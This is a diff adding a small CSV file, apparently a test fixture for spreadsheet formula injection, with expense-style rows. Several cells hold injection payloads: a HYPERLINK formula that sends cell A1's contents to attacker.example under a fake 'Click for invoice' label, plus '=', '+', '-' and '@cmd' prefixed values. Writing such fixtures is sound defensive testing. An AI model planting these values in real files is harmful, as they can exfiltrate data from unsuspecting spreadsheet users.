@@ -1,0 +1,4 @@
+category,item,estimated,actual,date,notes
+Software,"=HYPERLINK(""http://attacker.example/?leak=""&A1,""Click for invoice"")",100,120,2026-01-01,"=1+1"
+Software,+SUM(1+1),200,210,2026-01-01,@cmd
+Labour,-2+3,300,330,2026-01-01,
